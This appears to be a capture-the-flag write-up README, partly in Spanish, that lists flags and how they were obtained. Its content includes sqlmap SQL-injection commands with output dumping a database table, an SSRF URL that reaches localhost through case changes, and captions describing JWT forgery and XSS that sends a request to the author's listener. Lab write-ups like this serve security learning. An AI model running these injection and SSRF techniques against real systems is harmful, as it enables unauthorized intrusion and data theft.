# HackSAG

Brief description here of the challenge

## FLAG{ALWAYS_CHECK_COMMITS}

![imagen del commit donde hemos encontrado el flag](./images/FLAG{ALWAYS_CHECK_COMMITS}_1.jpg?raw=true)

## FLAG{Update_Plugins!}

python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --tables

[20:04:16] [INFO] fetching number of tables for database 'flag'
[20:04:16] [INFO] retrieved: 1
[20:04:18] [INFO] retrieved: flag

python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --dump -D flag -T flag

[20:20:00] [INFO] fetching entries for table 'flag' in database 'flag'
[20:20:00] [INFO] fetching number of entries for table 'flag' in database 'flag'
[20:20:00] [INFO] retrieved: 1
[20:20:04] [INFO] retrieved: FLAG{Update_Plugins!}

## API_FLAG{Never_public_your_secret}

![Hacemos el fuzz para encontrar mas endpoints](./images/fuzz_1.jpg?raw=true)

![cambiamos algunas cosas del token(user y le pinemos admin, y ponemos la JWT_SECRET_KEY](./images/token_admin.jpg?raw=true)


## FLAG{sanitize_input}

![Hacemos cross side scripting para enviar una peticion a nuestro kali](./images/cross_side_scripting_2.png?raw=true)

![Ponemos un listener en el teminal y cuando se envia la peticion nosotros con el listener la capturamos y conseguimos la flag](./images/FLAG{sanitize_input}.jpg?raw=true)


## FLAG{SSRF_PARA_TOD@S_XD}

![Cambiamos la url para llegar al sitio concreto cambiando letras y todo ](./images/FLAG{SSRF_PARA_TOD@S_XD}.jpg?raw=true)

Para conseguir la Flag hemos usado el URL: http://192.168.56.101/testsite.php?url=http://locAlhost:1337

## FLAG

Describe here the process to find the flag (you can include videos, images, etc)
